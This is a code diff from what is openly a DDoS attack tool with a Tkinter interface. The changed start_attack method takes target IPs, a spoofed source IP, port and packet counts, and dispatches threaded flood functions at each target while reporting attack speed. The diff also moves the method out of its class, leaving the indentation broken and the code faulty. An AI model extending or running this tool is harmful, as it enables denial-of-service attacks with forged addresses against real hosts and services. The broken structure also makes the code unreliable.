@@ -63,43 +63,47 @@ class DDoSAttackTool:
         tk.Button(self.root, text="Start Attack", command=self.start_attack).pack()
         tk.Button(self.root, text="Stop Attack", command=self.stop_attack).pack()
 
-    def start_attack(self):
-        target_ips = self.get_target_ips()
-        fake_ip = self.fake_ip_entry.get()
-        port = int(self.port_entry.get())
-        num_packets = int(self.num_packets_entry.get())
-        burst_interval = float(self.burst_interval_entry.get())
-        attack_type = self.attack_type_entry.get()
+def start_attack(self):
+    target_ips = self.get_target_ips()
+    fake_ip = self.fake_ip_entry.get()
+    port = int(self.port_entry.get())
+    num_packets = int(self.num_packets_entry.get())
+    burst_interval = float(self.burst_interval_entry.get())
+    attack_type = self.attack_type_entry.get()
 
-        attack_function = self.get_attack_function(attack_type)
+    attack_function = self.get_attack_function(attack_type)
 
-        self.attack_start_time = time.time()
-        self.total_bytes_sent = 0
+    self.attack_start_time = time.time()
+    self.total_bytes_sent = 0
 
-        # Update the attack status label
-        self.attack_status_label.config(text="Attack Status: In Progress")
-        self.root.update()
+    # Update the attack status label
+    self.attack_status_label.config(text="Attack Status: In Progress")
+    self.root.update()
 
-        with ThreadPoolExecutor() as executor:
-            for target in target_ips:
-                if self.stop_attack_flag:
-                    break
-                executor.submit(attack_function, target, port, num_packets, burst_interval)
-                time.sleep(1)  # Check the flag every second
+    with ThreadPoolExecutor() as executor:
+        for target in target_ips:
+            if self.stop_attack_flag:
+                break
+            executor.submit(attack_function, target, port, num_packets, burst_interval)
+            time.sleep(1)  # Check the flag every second
 
-                # Update the attack speed label
-                self.attack_speed_label.config(text=f"Attack Speed: {self.get_attack_speed():.2f} GB/s")
-                self.root.update()
+            # Update the attack speed label
+            self.attack_speed_label.config(text=f"Attack Speed: {self.get_attack_speed():.2f} GB/s")
+            self.root.update()
 
-                # Increment the progress bar value
-                self.progress_bar["value"] += 1
-                self.root.update()
+            # Increment the progress bar value
+            self.progress_bar["value"] += 1
+            self.root.update()
 
-        # Update the attack status label
-        self.attack_status_label.config(text="Attack Status: Not in Progress")
-        self.root.update()
+            # Print packet information
+            print(f"Sent {self.attack_num} packet to {target} through port: {port}")
 
-        print(f"Final attack speed: {self.get_attack_speed():.2f} GB/s")
+    # Update the attack status label
+    self.attack_status_label.config(text="Attack Status: Not in Progress")
+    self.root.update()
+
+    print(f"Final attack speed: {self.get_attack_speed():.2f} GB/s")
+
 
     def stop_attack(self):
         self.stop_attack_flag = True
